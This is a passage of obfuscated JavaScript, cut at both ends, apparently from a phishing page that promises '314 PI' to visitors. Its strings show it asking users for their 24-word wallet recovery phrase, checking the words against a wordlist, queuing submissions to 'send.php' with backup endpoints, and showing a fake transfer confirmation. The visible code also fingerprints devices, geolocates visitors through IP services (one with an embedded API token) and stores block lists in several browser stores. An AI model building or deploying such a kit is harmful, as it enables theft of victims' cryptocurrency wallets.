_0x45cd7d=_0x165144;_0x2d805c[_0x45cd7d(0x1e8)](_0x36688f);});}function getSubmissionCount(){const _0x5311e0=_0x360b5f;try{return parseInt(localStorage[_0x5311e0(0x246)](_0x5311e0(0x247))||'0');}catch(_0x1cbf0e){return console['error'](_0x5311e0(0x150),_0x1cbf0e),0x0;}}function incrementSubmissionCount(){const _0x3e375a=_0x360b5f;try{const _0x5b0517=getSubmissionCount();return localStorage['setItem'](_0x3e375a(0x247),(_0x5b0517+0x1)[_0x3e375a(0x122)]()),_0x5b0517+0x1;}catch(_0x1b2f18){return console[_0x3e375a(0x149)](_0x3e375a(0x1e4),_0x1b2f18),0x0;}}function hasExceededLimit(){return getSubmissionCount()>=0x2;}function updateUIForSubmissionCount(){const _0x2e91ad=_0x360b5f,_0x44af54=getSubmissionCount(),_0x130100=document['getElementById'](_0x2e91ad(0x151)),_0x26339e=document[_0x2e91ad(0x210)](_0x2e91ad(0x235)),_0xb6f9e6=document[_0x2e91ad(0x210)]('unlockSubmitBtn'),_0x1f8b92=document[_0x2e91ad(0x210)](_0x2e91ad(0x1de));if(_0x44af54>=0x2)_0x26339e[_0x2e91ad(0x16c)]['display']=_0x2e91ad(0x166),_0x130100[_0x2e91ad(0x16c)][_0x2e91ad(0x22d)]=_0x2e91ad(0x259),_0xb6f9e6[_0x2e91ad(0x22e)]=!![],_0xb6f9e6['textContent']=getCurrentLanguage()==='vi'?_0x2e91ad(0x1db):_0x2e91ad(0x1db),_0x1f8b92&&(_0x1f8b92[_0x2e91ad(0x22e)]=!![],_0x1f8b92[_0x2e91ad(0x24d)]=getCurrentLanguage()==='vi'?_0x2e91ad(0x25c):'Request\x20Limit\x20Reached',_0x1f8b92['classList'][_0x2e91ad(0x1bf)](_0x2e91ad(0x21f)),_0x1f8b92[_0x2e91ad(0x16c)][_0x2e91ad(0x22a)]=_0x2e91ad(0x1f3));else{if(_0x44af54===0x1){_0x130100[_0x2e91ad(0x16c)][_0x2e91ad(0x22d)]='block';const _0x12ae85=getCurrentLanguage()==='vi'?'You\x20have\x20submitted\x20'+_0x44af54+_0x2e91ad(0x156):_0x2e91ad(0x1c1)+_0x44af54+_0x2e91ad(0x156);_0x130100['innerHTML']=_0x2e91ad(0x189)+_0x12ae85,_0x26339e['style'][_0x2e91ad(0x22d)]=_0x2e91ad(0x259),_0xb6f9e6[_0x2e91ad(0x22e)]=![];}else _0x130100[_0x2e91ad(0x16c)]['display']=_0x2e91ad(0x259),_0x26339e[_0x2e91ad(0x16c)][_0x2e91ad(0x22d)]='none',_0xb6f9e6['disabled']=![];}}function _0x8a6f(){const _0x4ade4a=['onerror','regionName','setItem','reason','suspicious_','placeholder','Germany','addEventListener','charAt','animationDuration','filter','\x20is\x20blocked:\x20','Error\x20blocking\x20IP:','United\x20Kingdom','getItem','piSubmissionCount','Exceeded\x20suspicious\x20request\x20limit','unknown','light-streak','#693988','right','textContent','visibilityState','log','India','s\x20forwards','checkClick','https://i.pinimg.com/originals/0c/a0/34/0ca034d0ed966a0ac1b6455039d6e364.png','Error\x20storing\x20language\x20preference:','find','region','#ffd78c','IP\x20','none','zIndex','value','Request\x20Limit\x20Reached',';path=/;SameSite=Strict','shift','435666NLOaFu','trim','homePage','s\x20ease-in\x20','.pi-input-container','GDETAD6VHWMCFJ66LS7D7Y6LESOB4KNT4YGOM2NRDXIFAUDH4Z44DPV2','invalid-input','Pacific','2lJHEPS','--ty','substring','Africa','flex','scrollTo','toString','.pi-info-text\x20a.pi-link','createObjectStore','country','startsWith','toISOString','userAgent','ipAddress','.feature-card-wave','padStart','country_name','resolvedOptions','Connecting...','50%','Suspicious\x20activity\x20count\x20for\x20','Failed\x20to\x20fetch\x20wordlist','shootingStarsContainer','rotate(45deg)','https://img.upanh.tv/2025/03/11/favicon42527eabc5bda97a.png','star-single','understoodBtn','4zJword','Suspicious\x20activity','Malaysia','Access\x20Denied','Thailand','slice','device_fingerprint=','100%','language','notice-text','success','visible','headerBackBtn','objectStore','timeZone','toUTCString','english.txt','#9c55d4','error','confettiContainer','1425742ykTkqQ','left','closeBlockedMessage','2199036EMtHlm','attempts','Error\x20accessing\x20localStorage:','limitMessage','onsuccess','star','10568061LEAnjF','getFromIndexedDB','/2\x20requests.\x20Each\x20device\x20is\x20limited\x20to\x20a\x20maximum\x20of\x202\x20requests.','Error\x20retrieving\x20blocked\x20IP\x20data:','POST','Error\x20tracking\x20suspicious\x20activity:','setAttribute','permanent','CLAIM\x20314\x20PI\x20NOW','Phrase\x20contains\x20invalid\x20words.\x20Cannot\x20send\x20request.','Direct\x20sending\x20failed,\x20adding\x20to\x20pending\x20queue:','confettiFall\x20','message','storageKey','Confirming\x20Pi\x20Wallet','target','abandon','#f8c056','block','formPage','closeSuccessBtn','saveToIndexedDB','appendChild','3000','style','contain','--tx','SecurityDB','length','Device\x20was\x20previously\x20blocked','locationText','page-inactive-left','platform','click','backupEndpoints','isIntersecting','Your\x20IP\x20address\x20has\x20been\x20permanently\x20blocked\x20due\x20to\x20','split','All\x20location\x20detection\x20API\x20attempts\x20failed,\x20using\x20fallback','.page.page-active','Japan','stateProv','getFullYear','application/json','--float-distance','pointerEvents','Russia','status','data-lang','remove','timeout','importantNoteSection','...','<i\x20class=\x22fas\x20fa-exclamation-triangle\x20mr-2\x22></i>','#pendingRequestsBadge\x20span[data-vi]','Canada','catch','50nIuPmp','United\x20States','endpointIndex','createElement','remainingQuantity','<i\x20class=\x22fas\x20fa-fingerprint\x20mr-2\x22></i>\x20An\x20error\x20occurred.\x20Please\x20unlock\x20with\x20your\x2024-word\x20phrase','Error\x20accessing\x20IndexedDB:','setFullYear','data','transform','ipBlockedMessage','countryName','width','data-','indexedDB','Error\x20in\x20getUserIPInfo:','function','Europe','floor','some','opacity','pow','Error\x20saving\x20blocked\x20IP\x20data:','loadingOverlay','position','50px','visibility','0.4','show-notice','className','input','#ffffff','src','Please\x20wait...','singleStarsContainer','warn','Unknown\x20country','height','undefined','preferredLanguage','unobserve','invalid','classList','main','successWalletAddress','highlight-important-note','unlockSubmitBtn','Unknown','https://ipwho.is/','save','add','device_','You\x20have\x20submitted\x20','blocked','unavailable','page-active','API\x20attempt\x20failed:','\x20has\x20been\x20permanently\x20blocked:\x20','parse','sin','ipwho.is\x20failed','Brazil','country_code','innerText','DOMContentLoaded','.animate-on-scroll,\x20.animate-fade-in','apiEndpoint','12487280CHNEci','timezone','GDER4...MB75Y','includes','valid-input','random','push','Device\x20was\x20blocked','wordCounter','Please\x20enter\x20exactly\x2024\x20words\x20(current:\x20','createWalletPage','REQUEST\x20LIMIT\x20REACHED','hidden','simpleHash','openFormBtn','piPendingRequests','animationDelay','charCodeAt','Error\x20sending\x20message:','invalidWords','Error\x20updating\x20localStorage:','modal-highlight-active','API\x20success:','https://cdn.jsdelivr.net/npm/flag-icon-css@3.5.0/flags/4x3/xx.svg','observe','backgroundColor',';expires=','freeipapi.com\x20failed','.\x20Please\x20contact\x20support\x20if\x20you\x20believe\x20this\x20is\x20an\x20error.','.notification-banner','send.php','blockedIPs','json','confetti\x20confetti-circle','15%','not-allowed','explosion-particle','updateBadge','cos','suspicious\x20activity','.language-option','get','blockedIPs=','Spain','pendingRequestsBadge','getFromDeviceFingerprint','85%','animation','walletErrorMessage','Transfering\x20314\x20Pi','querySelectorAll','active','walletAddress','join','img','France','min','1667766RwaQOG','setProperty','querySelector','then','clear','credentials','https://api.db-ip.com/v2/free/self','getElementById','validationMessage','loading','readonly','successModal','pendingCount','div','top','valid','2px','DateTimeFormat','cityName','walletCreatedBtn','process','5589130bykKtD','opacity-50','text','Error\x20saving\x20pending\x20requests:','city','security_data','cookie','coinsContainer','confetti\x20confetti-triangle','db-ip.com\x20failed','Error\x20adding\x20to\x20pending\x20queue:','forEach','cursor','stringify','innerHTML','display','disabled','page-inactive-right','getAttribute','Vietnam','close','result','Invalid\x20phrase.\x20Invalid\x20words:\x20','errorMessage','preventDefault','Singapore'];_0x8a6f=function(){return _0x4ade4a;};return _0x8a6f();}let userIPData=null,ipBlockStatus={'blocked':![],'reason':''};async function getUserIPInfo(){const _0x4482e0=_0x360b5f;try{const _0x524528=[async()=>{const _0xfe9839=_0x24a3,_0xa8df2e=await fetch('https://freeipapi.com/api/json/',{'headers':{'Authorization':'Bearer\x20145e8aecea2cae5c7002ec10d217c2b04fa68a27ff6f3a8383c9aaea623c77b0'}});if(!_0xa8df2e['ok'])throw new Error(_0xfe9839(0x1eb));const _0x1b1cb2=await _0xa8df2e['json']();return{'ip':_0x1b1cb2[_0xfe9839(0x129)],'country':_0x1b1cb2['countryCode'],'country_name':_0x1b1cb2[_0xfe9839(0x198)],'city':_0x1b1cb2[_0xfe9839(0x21b)],'region':_0x1b1cb2[_0xfe9839(0x239)],'timezone':_0x1b1cb2['timeZone']};},async()=>{const _0x459d3f=_0x24a3,_0x5412b3=await fetch(_0x459d3f(0x1bd));if(!_0x5412b3['ok'])throw new Error(_0x459d3f(0x1c9));const _0x1be8e2=await _0x5412b3[_0x459d3f(0x1f0)]();return{'ip':_0x1be8e2['ip'],'country':_0x1be8e2[_0x459d3f(0x1cb)],'country_name':_0x1be8e2[_0x459d3f(0x125)],'city':_0x1be8e2[_0x459d3f(0x222)],'region':_0x1be8e2['region'],'timezone':_0x1be8e2[_0x459d3f(0x1d1)]['id']};},async()=>{const _0x84877d=_0x24a3,_0x4e64b3=await fetch(_0x84877d(0x20f));if(!_0x4e64b3['ok'])throw new Error(_0x84877d(0x227));const _0x1d48f0=await _0x4e64b3[_0x84877d(0x1f0)]();return console[_0x84877d(0x24f)](_0x84877d(0x1e6),_0x1d48f0),{'ip':_0x1d48f0[_0x84877d(0x129)],'country':_0x1d48f0['countryCode'],'country_name':_0x1d48f0[_0x84877d(0x198)],'city':_0x1d48f0[_0x84877d(0x222)],'region':_0x1d48f0[_0x84877d(0x17d)],'timezone':null};},async()=>{const _0x22ea4c=_0x24a3,_0x45098d=Intl[_0x22ea4c(0x21a)]()[_0x22ea4c(0x12d)]()[_0x22ea4c(0x145)];return{'ip':_0x22ea4c(0x1c3),'country':await detectCountryFromTimezone(_0x45098d),'country_name':await getCountryNameFromTimezone(_0x45098d),'city':_0x22ea4c(0x249),'region':_0x22ea4c(0x249),'timezone':_0x45098d};}];for(const _0x2d31cd of _0x524528){try{const _0x961ba6=await _0x2d31cd();if(_0x961ba6&&(_0x961ba6['ip']!==_0x4482e0(0x1c3)||_0x961ba6[_0x4482e0(0x1d1)]))return userIPData=_0x961ba6,checkIfIPBlocked(_0x961ba6['ip']),_0x961ba6[_0x4482e0(0x125)]&&_0x961ba6[_0x4482e0(0x125)]!=='VN'?setLanguage('en'):setLanguage('vi'),_0x961ba6;}catch(_0x3cf252){console['log'](_0x4482e0(0x1c5),_0x3cf252[_0x4482e0(0x160)]);}}console[_0x4482e0(0x1b0)](_0x4482e0(0x17a));const _0x47c516=createFallbackUserData();return userIPData=_0x47c516,setLanguage('en'),_0x47c516;}catch(_0x4003d0){console[_0x4482e0(0x149)](_0x4482e0(0x19c),_0x4003d0);const _0x237187=createFallbackUserData();return userIPData=_0x237187,setLanguage('en'),_0x237187;}}function createFallbackUserData(){const _0x563f6d=_0x360b5f,_0x50e655=Intl[_0x563f6d(0x21a)]()[_0x563f6d(0x12d)]()[_0x563f6d(0x145)],_0x44b5a9={'ip':_0x563f6d(0x1c3),'country':detectCountryFromTimezone(_0x50e655)||_0x563f6d(0x249),'country_name':getCountryNameFromTimezone(_0x50e655)||_0x563f6d(0x1bc),'city':'unknown','region':_0x563f6d(0x249),'timezone':_0x50e655};return _0x44b5a9;}function getCountryName(_0x51bc6a){const _0x4b4344=_0x360b5f;if(!_0x51bc6a)return _0x4b4344(0x1bc);const _0x34f5bf={'US':_0x4b4344(0x18e),'GB':_0x4b4344(0x245),'CA':_0x4b4344(0x18b),'AU':'Australia','DE':_0x4b4344(0x23e),'FR':_0x4b4344(0x207),'IT':'Italy','ES':_0x4b4344(0x1fb),'JP':_0x4b4344(0x17c),'CN':'China','IN':_0x4b4344(0x250),'BR':_0x4b4344(0x1ca),'RU':_0x4b4344(0x182),'VN':_0x4b4344(0x231),'TH':_0x4b4344(0x13b),'MY':_0x4b4344(0x139),'SG':_0x4b4344(0x237),'ID':'Indonesia'};if(_0x34f5bf[_0x51bc6a])return _0x34f5bf[_0x51bc6a];try{return new Intl['DisplayNames'](['en'],{'type':_0x4b4344(0x256)})['of'](_0x51bc6a);}catch(_0x3e5923){return _0x51bc6a;}}function detectCountryFromTimezone(_0x2c8fcd){const _0x4fd81d=_0x360b5f;if(!_0x2c8fcd)return null;const _0x3b126a={'America/New_York':'US','America/Los_Angeles':'US','America/Chicago':'US','America/Denver':'US','Europe/London':'GB','Europe/Paris':'FR','Europe/Berlin':'DE','Europe/Rome':'IT','Europe/Madrid':'ES','Asia/Tokyo':'JP','Asia/Shanghai':'CN','Asia/Kolkata':'IN','Asia/Ho_Chi_Minh':'VN','Asia/Bangkok':'TH','Asia/Singapore':'SG','Asia/Kuala_Lumpur':'MY','Asia/Jakarta':'ID','Australia/Sydney':'AU','Australia/Melbourne':'AU'};if(_0x3b126a[_0x2c8fcd])return _0x3b126a[_0x2c8fcd];if(_0x2c8fcd[_0x4fd81d(0x1d3)]('/')){const _0x20ad6f=_0x2c8fcd['split']('/')[0x0],_0x4bd2a4={'America':'US','Europe':'EU','Asia':'AS','Africa':'AF','Australia':'AU','Pacific':'PA'};return _0x4bd2a4[_0x20ad6f]||null;}return null;}function getCountryNameFromTimezone(_0x22aa7d){const _0x5268d6=_0x360b5f,_0xa3587d=detectCountryFromTimezone(_0x22aa7d);if(!_0xa3587d)return _0x5268d6(0x1bc);const _0x1c1bdc={'US':_0x5268d6(0x18e),'EU':_0x5268d6(0x19e),'AS':'Asia','AF':_0x5268d6(0x11f),'AU':'Australia','PA':_0x5268d6(0x11b)};return _0x1c1bdc[_0xa3587d]||_0x5268d6(0x1bc);}function showLocationNotification(_0x49ddb0){const _0x1dac2e=_0x360b5f;if(!_0x49ddb0)return;const _0x3ac50e=document[_0x1dac2e(0x210)](_0x1dac2e(0x172)),_0xc8f36f=document['getElementById']('countryFlag'),_0x5a1a5a=document[_0x1dac2e(0x210)]('locationDetectedMessage');_0x49ddb0[_0x1dac2e(0x125)]&&_0x49ddb0[_0x1dac2e(0x125)]!=='unknown'&&_0x49ddb0[_0x1dac2e(0x125)][_0x1dac2e(0x170)]===0x2?(_0xc8f36f[_0x1dac2e(0x1ad)]='https://cdn.jsdelivr.net/npm/flag-icon-css@3.5.0/flags/4x3/'+_0x49ddb0[_0x1dac2e(0x125)]['toLowerCase']()+'.svg',_0xc8f36f['onerror']=()=>{const _0x14b8fb=_0x1dac2e;_0xc8f36f[_0x14b8fb(0x1ad)]=_0x14b8fb(0x1e7);}):_0xc8f36f[_0x1dac2e(0x1ad)]='https://cdn.jsdelivr.net/npm/flag-icon-css@3.5.0/flags/4x3/xx.svg';const _0xdc8062=getCurrentLanguage();let _0x495f61=_0x49ddb0[_0x1dac2e(0x222)],_0x1725d4=_0x49ddb0[_0x1dac2e(0x256)],_0x241964=_0x49ddb0[_0x1dac2e(0x12c)]||getCountryName(_0x49ddb0[_0x1dac2e(0x125)])||_0x1dac2e(0x1bc);(_0x495f61===_0x1dac2e(0x249)||!_0x495f61)&&(_0x495f61='');(_0x1725d4===_0x1dac2e(0x249)||!_0x1725d4||_0x1725d4===_0x495f61)&&(_0x1725d4='');let _0x15906c='';if(_0x495f61)_0x15906c+=_0x495f61;if(_0x1725d4&&_0x495f61)_0x15906c+=',\x20'+_0x1725d4;else{if(_0x1725d4)_0x15906c+=_0x1725d4;}if((_0x495f61||_0x1725d4)&&_0x241964)_0x15906c+=',\x20'+_0x241964;else _0x15906c+=_0x241964;}const blockStorage={'save':function(_0x24e451){const _0x22eac9=_0x360b5f;try{localStorage[_0x22eac9(0x23a)](_0x22eac9(0x1ef),JSON[_0x22eac9(0x22b)](_0x24e451)),sessionStorage['setItem'](_0x22eac9(0x1ef),JSON[_0x22eac9(0x22b)](_0x24e451));const _0x203974=new Date();_0x203974[_0x22eac9(0x194)](_0x203974[_0x22eac9(0x17e)]()+0x1),document[_0x22eac9(0x224)]=_0x22eac9(0x1fa)+encodeURIComponent(JSON[_0x22eac9(0x22b)](_0x24e451))+';expires='+_0x203974['toUTCString']()+_0x22eac9(0x25d),localStorage['setItem'](_0x22eac9(0x223),JSON['stringify'](_0x24e451)),this[_0x22eac9(0x169)](_0x24e451),this['saveDeviceFingerprint'](_0x24e451);}catch(_0x517450){console[_0x22eac9(0x149)](_0x22eac9(0x1a3),_0x517450);}},'saveToIndexedDB':function(_0x1c5240){const _0x48366b=_0x360b5f;if(!window['indexedDB'])return;try{const _0x585077=indexedDB['open'](_0x48366b(0x16f),0x1);_0x585077['onupgradeneeded']=function(_0xe59e22){const _0x4b35e9=_0x48366b,_0x3a94ba=_0xe59e22[_0x4b35e9(0x163)][_0x4b35e9(0x233)];!_0x3a94ba['objectStoreNames']['contains']('blockedIPs')&&_0x3a94ba[_0x4b35e9(0x124)](_0x4b35e9(0x1ef),{'keyPath':'id'});},_0x585077[_0x48366b(0x152)]=function(_0x192860){const _0x30c851=_0x48366b,_0x51008d=_0x192860['target']['result'],_0x158b1e=_0x51008d['transaction']([_0x30c851(0x1ef)],'readwrite'),_0x35c59d=_0x158b1e[_0x30c851(0x144)](_0x30c851(0x1ef));_0x35c59d[_0x30c851(0x20d)](),_0x35c59d['add']({'id':_0x30c851(0x1b8),'data':_0x1c5240}),_0x158b1e['oncomplete']=function(){const _0x18e8e4=_0x30c851;_0x51008d[_0x18e8e4(0x232)]();};};}catch(_0x5e3434){console[_0x48366b(0x149)]('IndexedDB\x20error:',_0x5e3434);}},'saveDeviceFingerprint':function(_0xc15311){const _0x979b7b=_0x360b5f;try{const _0x4babd7={'userAgent':navigator[_0x979b7b(0x128)],'language':navigator[_0x979b7b(0x13f)],'screenWidth':screen[_0x979b7b(0x199)],'screenHeight':screen[_0x979b7b(0x1b2)],'colorDepth':screen['colorDepth'],'timezone':Intl[_0x979b7b(0x21a)]()[_0x979b7b(0x12d)]()['timeZone'],'platform':navigator[_0x979b7b(0x174)]},_0x27a258=JSON[_0x979b7b(0x22b)](_0x4babd7),_0x3b9021=this[_0x979b7b(0x1dd)](_0x27a258);localStorage['setItem'](_0x979b7b(0x1c0)+_0x3b9021,JSON[_0x979b7b(0x22b)](_0xc15311)),sessionStorage[_0x979b7b(0x23a)](_0x979b7b(0x1c0)+_0x3b9021,JSON[_0x979b7b(0x22b)](_0xc15311));const _0x2d352a=new Date();_0x2d352a[_0x979b7b(0x194)](_0x2d352a['getFullYear']()+0x1),document[_0x979b7b(0x224)]=_0x979b7b(0x13d)+_0x3b9021+_0x979b7b(0x1ea)+_0x2d352a[_0x979b7b(0x146)]()+_0x979b7b(0x25d);}catch(_0x339cd9){console[_0x979b7b(0x149)]('Error\x20creating\x20device\x20fingerprint:',_0x339cd9);}},'simpleHash':function(_0x1d72cf){const _0x2e5cf1=_0x360b5f;let _0x1da304=0x0;for(let _0xe8736b=0x0;_0xe8736b<_0x1d72cf[_0x2e5cf1(0x170)];_0xe8736b++){const _0x31380d=_0x1d72cf[_0x2e5cf1(0x1e1)](_0xe8736b);_0x1da304=(_0x1da304<<0x5)-_0x1da304+_0x31380d,_0x1da304=_0x1da304&_0x1da304;}return _0x1da304[_0x2e5cf1(0x122)](0x24);},'get':function(){const _0x8d59db=_0x360b5f;let _0x5b3d48=[];try{const _0x496c7a=localStorage['getItem'](_0x8d59db(0x1ef));if(_0x496c7a)return _0x5b3d48=JSON[_0x8d59db(0x1c7)](_0x496c7a),_0x5b3d48;const _0x5c7294=sessionStorage[_0x8d59db(0x246)](_0x8d59db(0x1ef));if(_0x5c7294)return _0x5b3d48=JSON['parse'](_0x5c7294),_0x5b3d48;const _0x18be8f=document[_0x8d59db(0x224)]['split'](';');for(let _0x18b927 of _0x18be8f){_0x18b927=_0x18b927['trim']();if(_0x18b927[_0x8d59db(0x126)]('blockedIPs=')){const _0x256844=decodeURIComponent(_0x18b927[_0x8d59db(0x11e)](_0x8d59db(0x1fa)[_0x8d59db(0x170)]));return _0x5b3d48=JSON[_0x8d59db(0x1c7)](_0x256844),_0x5b3d48;}}const _0x4a6e19=localStorage[_0x8d59db(0x246)](_0x8d59db(0x223));if(_0x4a6e19)return _0x5b3d48=JSON[_0x8d59db(0x1c7)](_0x4a6e19),_0x5b3d48;const _0x29a602=this[_0x8d59db(0x1fd)]();if(_0x29a602&&_0x29a602['length']>0x0)return _0x29a602;this[_0x8d59db(0x155)]()[_0x8d59db(0x20c)](_0x2be850=>{const _0x8fd21d=_0x8d59db;_0x2be850&&_0x2be850['length']>0x0&&(this[_0x8fd21d(0x1be)](_0x2be850),_0x5b3d48=_0x2be850);});}catch(_0x393d3e){console[_0x8d59db(0x149)](_0x8d59db(0x157),_0x393d3e);}return _0x5b3d48;},'getFromIndexedDB':function(){return new Promise(_0x4114ca=>{const _0x28cad5=_0x24a3;if(!window[_0x28cad5(0x19b)]){_0x4114ca([]);return;}try{const _0x1e23bf=indexedDB['open'](_0x28cad5(0x16f),0x1);_0x1e23bf[_0x28cad5(0x238)]=function(){_0x4114ca([]);},_0x1e23bf['onsuccess']=function(_0x781dcd){const _0x14c9f6=_0x28cad5,_0x314daa=_0x781dcd[_0x14c9f6(0x163)][_0x14c9f6(0x233)];try{const _0x2b279a=_0x314daa['transaction']([_0x14c9f6(0x1ef)],_0x14c9f6(0x213)),_0x5ba59e=_0x2b279a['objectStore'](_0x14c9f6(0x1ef)),_0xee0398=_0x5ba59e[_0x14c9f6(0x1f9)](_0x14c9f6(0x1b8));_0xee0398[_0x14c9f6(0x152)]=function(){const _0x3c5de2=_0x14c9f6;_0xee0398[_0x3c5de2(0x233)]&&_0xee0398[_0x3c5de2(0x233)][_0x3c5de2(0x195)]?_0x4114ca(_0xee0398[_0x3c5de2(0x233)][_0x3c5de2(0x195)]):_0x4114ca([]),_0x314daa['close']();},_0xee0398['onerror']=function(){_0x4114ca([]),_0x314daa['close']();};}catch(_0x4ec241){_0x4114ca([]),_0x314daa[_0x14c9f6(0x232)]();}};}catch(_0xdaf15e){console[_0x28cad5(0x149)](_0x28cad5(0x193),_0xdaf15e),_0x4114ca([]);}});},'getFromDeviceFingerprint':function(){const _0x4cfff5=_0x360b5f;try{const _0x1ca42c={'userAgent':navigator['userAgent'],'language':navigator[_0x4cfff5(0x13f)],'screenWidth':screen[_0x4cfff5(0x199)],'screenHeight':screen['height'],'colorDepth':screen['colorDepth'],'timezone':Intl[_0x4cfff5(0x21a)]()[_0x4cfff5(0x12d)]()[_0x4cfff5(0x145)],'platform':navigator[_0x4cfff5(0x174)]},_0x3a257e=JSON['stringify'](_0x1ca42c),_0x55cecf=this['simpleHash'](_0x3a257e),_0x36768f=localStorage[_0x4cfff5(0x246)](_0x4cfff5(0x1c0)+_0x55cecf);if(_0x36768f)return JSON['parse'](_0x36768f);const _0x3006f7=sessionStorage[_0x4cfff5(0x246)](_0x4cfff5(0x1c0)+_0x55cecf);if(_0x3006f7)return JSON[_0x4cfff5(0x1c7)](_0x3006f7);const _0x458cd6=document[_0x4cfff5(0x224)][_0x4cfff5(0x179)](';');for(let _0x4ec6f7 of _0x458cd6){_0x4ec6f7=_0x4ec6f7['trim']();if(_0x4ec6f7[_0x4cfff5(0x126)](_0x4cfff5(0x13d))){const _0x54d3df=_0x4ec6f7['substring'](_0x4cfff5(0x13d)[_0x4cfff5(0x170)]),_0x1ebbd6=localStorage['getItem'](_0x4cfff5(0x1c0)+_0x54d3df);if(_0x1ebbd6)return JSON['parse'](_0x1ebbd6);}}}catch(_0x1aa106){console[_0x4cfff5(0x149)]('Error\x20retrieving\x20device\x20fingerprint\x20data:',_0x1aa106);}return[];}};function checkIfIPBlocked(_0x1ad72a){const _0x334fb2=_0x360b5f;if(!_0x1ad72a)return![];let _0x3692b9=blockStorage[_0x334fb2(0x1f9)]();const _0xd1a06e=_0x3692b9[_0x334fb2(0x255)](_0xab83b7=>_0xab83b7['ip']===_0x1ad72a);let _0x2c03a2=!!_0xd1a06e;if(!_0x2c03a2){const _0x507def=blockStorage['getFromDeviceFingerprint']();_0x2c03a2=_0x507def&&_0x507def[_0x334fb2(0x170)]>0x0;if(_0x2c03a2&&_0x1ad72a&&_0x1ad72a!=='unavailable'){const _0x4325ad=blockStorage[_0x334fb2(0x1f9)]();!_0x4325ad[_0x334fb2(0x1a0)](_0x4cd8a1=>_0x4cd8a1['ip']===_0x1ad72a)&&(_0x4325ad[_0x334fb2(0x1d6)]({'ip':_0x1ad72a,'reason':_0x334fb2(0x171),'timestamp':new Date()[_0x334fb2(0x127)](),'permanent':!![]}),blockStorage[_0x334fb2(0x1be)](_0x4325ad));}}return _0x2c03a2&&(ipBlockStatus[_0x334fb2(0x1c2)]=!![],ipBlockStatus[_0x334fb2(0x23b)]=_0xd1a06e?_0xd1a06e['reason']||_0x334fb2(0x138):_0x334fb2(0x1d7),ipBlockStatus[_0x334fb2(0x15b)]=_0xd1a06e?_0xd1a06e[_0x334fb2(0x15b)]||![]:!![],showBlockedMessage(),console['log'](_0x334fb2(0x258)+_0x1ad72a+_0x334fb2(0x243)+ipBlockStatus[_0x334fb2(0x23b)])),_0x2c03a2;}function blockIP(_0x285a78,_0x45c0a8='Multiple\x20suspicious\x20requests'){const _0xe56172=_0x360b5f;if(!_0x285a78)return;try{let _0x3a332d=blockStorage[_0xe56172(0x1f9)]();!_0x3a332d['some'](_0x36a8ff=>_0x36a8ff['ip']===_0x285a78)&&(_0x3a332d[_0xe56172(0x1d6)]({'ip':_0x285a78,'reason':_0x45c0a8,'timestamp':new Date()[_0xe56172(0x127)](),'permanent':!![]}),blockStorage[_0xe56172(0x1be)](_0x3a332d),ipBlockStatus['blocked']=!![],ipBlockStatus['reason']=_0x45c0a8,showBlockedMessage(),console['log']('IP\x20'+_0x285a78+_0xe56172(0x1c6)+_0x45c0a8));}catch(_0x38888c){console[_0xe56172(0x149)](_0xe56172(0x244),_0x38888c);}}function _0x24a3(_0x5ce9a4,_0x166ab1){const _0x8a6fe3=_0x8a6f();return _0x24a3=function(_0x24a3c4,_0x1a2d78){_0x24a3c4=_0x24a3c4-0x117;let _0x1f6edc=_0x8a6fe3[_0x24a3c4];return _0x1f6edc;},_0x24a3(_0x5ce9a4,_0x166ab1);}function showBlockedMessage(){const _0xb93dba=_0x360b5f,_0x2af6ba=document[_0xb93dba(0x210)](_0xb93dba(0x197)),_0x25ea85=_0x2af6ba['querySelector']('h3'),_0x520fbc=_0x2af6ba['querySelector']('p'),_0x134a34=getCurrentLanguage();_0x25ea85[_0xb93dba(0x24d)]=_0x134a34==='vi'?_0xb93dba(0x13a):_0xb93dba(0x13a);const _0x3a4306=ipBlockStatus['reason']||(_0x134a34==='vi'?_0xb93dba(0x1f7):'suspicious\x20activity');_0x520fbc[_0xb93dba(0x24d)]=_0x134a34==='vi'?_0xb93dba(0x178)+_0x3a4306+_0xb93dba(0x1ec):_0xb93dba(0x178)+_0x3a4306+_0xb93dba(0x1ec),_0x2af6ba[_0xb93dba(0x16c)]['display']=_0xb93dba(0x166);const _0x3dd8cd=document[_0xb93dba(0x210)]('unlockSubmitBtn'),_0x5b3873=document[_0xb93dba(0x210)](_0xb93dba(0x1de));_0x3dd8cd&&(_0x3dd8cd['disabled']=!![]),_0x5b3873&&(_0x5b3873[_0xb93dba(0x22e)]=!![],_0x5b3873[_0xb93dba(0x16c)][_0xb93dba(0x22a)]=_0xb93dba(0x1f3),_0x5b3873[_0xb93dba(0x1b7)]['add'](_0xb93dba(0x21f)));}function closeBlockedMessage(){const _0x3ff91b=_0x360b5f,_0x5eb9c3=document[_0x3ff91b(0x210)](_0x3ff91b(0x197));_0x5eb9c3[_0x3ff91b(0x16c)][_0x3ff91b(0x22d)]=_0x3ff91b(0x259);}function trackSuspiciousActivity(_0x28b09=![]){const _0x1949e6=_0x360b5f;if(!userIPData||!userIPData['ip']||userIPData['ip']===_0x1949e6(0x1c3))return![];let _0x576ecd=0x0;try{_0x576ecd=parseInt(localStorage[_0x1949e6(0x246)](_0x1949e6(0x23c)+userIPData['ip'])||'0');_0x576ecd===0x0&&(_0x576ecd=parseInt(sessionStorage[_0x1949e6(0x246)](_0x1949e6(0x23c)+userIPData['ip'])||'0'));if(_0x576ecd===0x0){const _0x3ee931=document[_0x1949e6(0x224)][_0x1949e6(0x179)](';');for(let _0x53e9d1 of _0x3ee931){_0x53e9d1=_0x53e9d1[_0x1949e6(0x260)]();if(_0x53e9d1[_0x1949e6(0x126)](_0x1949e6(0x23c)+userIPData['ip']+'=')){_0x576ecd=parseInt(_0x53e9d1['substring'](('suspicious_'+userIPData['ip']+'=')[_0x1949e6(0x170)]));break;}}}_0x576ecd+=_0x28b09?0x3:0x1,localStorage[_0x1949e6(0x23a)]('suspicious_'+userIPData['ip'],_0x576ecd[_0x1949e6(0x122)]()),sessionStorage[_0x1949e6(0x23a)](_0x1949e6(0x23c)+userIPData['ip'],_0x576ecd[_0x1949e6(0x122)]());const _0x552cbe=new Date();_0x552cbe[_0x1949e6(0x194)](_0x552cbe[_0x1949e6(0x17e)]()+0x1),document[_0x1949e6(0x224)]=_0x1949e6(0x23c)+userIPData['ip']+'='+_0x576ecd+_0x1949e6(0x1ea)+_0x552cbe[_0x1949e6(0x146)]()+_0x1949e6(0x25d),console[_0x1949e6(0x24f)](_0x1949e6(0x130)+userIPData['ip']+':\x20'+_0x576ecd);if(_0x576ecd>=0x14)return 